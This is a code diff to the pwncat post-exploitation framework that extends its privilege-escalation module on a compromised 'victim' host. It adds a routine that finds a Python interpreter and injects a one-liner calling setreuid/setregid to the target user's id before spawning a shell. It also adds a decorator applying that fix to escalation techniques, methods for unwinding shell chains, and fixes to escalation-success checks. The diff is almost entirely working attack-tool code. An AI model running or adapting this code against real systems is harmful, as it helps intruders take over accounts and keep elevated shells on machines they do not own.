@@ -21,6 +21,62 @@ class EscalateError(Exception):
     """ Indicates an error while attempting some escalation action """
 
 
+def fix_euid_mismatch(target_uid: int, target_gid: int):
+    """ Attempt to gain EUID=UID=target_uid.
+
+    This is intended to fix EUID/UID mismatches after a escalation.
+    """
+
+    pythons = [
+        "python",
+        "python3",
+        "python3.6",
+        "python3.8",
+        "python3.9",
+        "python2.7",
+        "python2.6",
+    ]
+    for python in pythons:
+        python_path = pwncat.victim.which(python)
+        if python_path is not None:
+            break
+
+    if python_path is not None:
+        command = f"exec {python_path} -c '"
+        command += f"""import os; os.setreuid({target_uid}, {target_uid}); os.setregid({target_gid}, {target_gid}); os.system("{pwncat.victim.shell}")"""
+        command += "'\n"
+        pwncat.victim.process(command)
+
+        new_id = pwncat.victim.id
+        if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
+            return
+
+    raise EscalateError("failed to resolve euid/uid mismatch")
+
+
+def euid_fix(technique_class):
+    """
+    Decorator for Technique classes which may end up with a RUID/EUID
+    mismatch. This will check the resulting UID before/after to see
+    if the change was affective and attempt to fix it.
+    """
+
+    class Wrapper(technique_class):
+        def exec(self, binary: str):
+
+            # Run the real exec
+            super(Wrapper, self).exec(binary)
+
+            # Check id again
+            ending_id = pwncat.victim.id
+
+            # If needed fix the UID
+            if ending_id["euid"]["id"] != ending_id["uid"]["id"]:
+                fix_euid_mismatch(ending_id["euid"]["id"], ending_id["egid"]["id"])
+
+    return Wrapper
+
+
 @dataclasses.dataclass
 class Technique:
     """ Describes a technique possible through some module.
@@ -196,6 +252,17 @@ class EscalateChain(Result):
         """ Add a link in the chain """
         self.chain.append((technique, exit_cmd))
 
+    def extend(self, chain: "EscalateChain"):
+        """ Extend this chain with another chain """
+        self.chain.extend(chain.chain)
+
+    def pop(self):
+        """ Exit and remove the last link in the chain """
+        _, exit_cmd = self.chain.pop()
+        pwncat.victim.client.send(exit_cmd)
+        pwncat.victim.reset(hard=False)
+        pwncat.victim.update_user()
+
     def unwrap(self):
         """ Exit each shell in the chain with the provided exit script """
 
@@ -203,6 +270,9 @@ class EscalateChain(Result):
         for technique, exit_cmd in self.chain[::-1]:
             # Send the exit command
             pwncat.victim.client.send(exit_cmd)
+
+        pwncat.victim.reset(hard=False)
+        pwncat.victim.update_user()
 
 
 @dataclasses.dataclass
@@ -238,7 +308,7 @@ class EscalateResult(Result):
         This allows you to enumerate multiple modules and utilize all their
         techniques together to perform escalation. """
 
-        for key, value in result.techniques:
+        for key, value in result.techniques.items():
             if key not in self.techniques:
                 self.techniques[key] = value
             else:
@@ -328,6 +398,7 @@ class EscalateResult(Result):
 
         original_user = pwncat.victim.current_user
         original_id = pwncat.victim.id
+        target_user = pwncat.victim.users[user]
         task = progress.add_task("", module="escalating", status="...")
 
         if user in self.techniques:
@@ -358,7 +429,9 @@ class EscalateResult(Result):
 
                         # Check that the escalation succeeded
                         new_id = pwncat.victim.id
-                        if new_id["euid"] == original_id["euid"]:
+                        if new_id["euid"]["id"] != target_user.id:
+                            pwncat.victim.client.send(exit_cmd.encode("utf-8"))
+                            pwncat.victim.flush_output(some=False)
                             continue
 
                         return EscalateChain(
@@ -491,6 +564,9 @@ class EscalateResult(Result):
 
                 # The test worked! Run the real escalate command
                 pwncat.victim.process(command)
+
+                pwncat.victim.reset(hard=False)
+                pwncat.victim.update_user()
 
                 return EscalateChain(original_user.name, [(used_tech, "exit")])
 
